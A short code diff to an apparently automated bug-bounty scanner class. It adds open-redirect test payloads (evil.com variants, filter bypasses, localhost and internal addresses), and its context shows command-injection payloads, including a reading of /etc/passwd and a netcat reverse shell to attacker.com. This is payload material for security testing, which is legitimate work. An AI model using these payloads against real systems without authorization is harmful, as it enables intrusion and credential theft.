@@ -257,6 +257,19 @@ class BugBountyAI:
                     '&& id',
                     '; cat /etc/passwd',
                     '| nc attacker.com 4444 -e /bin/sh'
+                ],
+                'open_redirect': [
+                    'https://evil.com',
+                    '//evil.com',
+                    '/\\evil.com',
+                    '///evil.com',
+                    'https://example.com@evil.com',
+                    'https://example.com%09@evil.com',
+                    'http://localhost',
+                    'http://127.0.0.1',
+                    'http://internal.service',
+                    'https://attacker.com',
+                    'http://malicious.site'
                 ]
             },
             'detailed_reporting': True
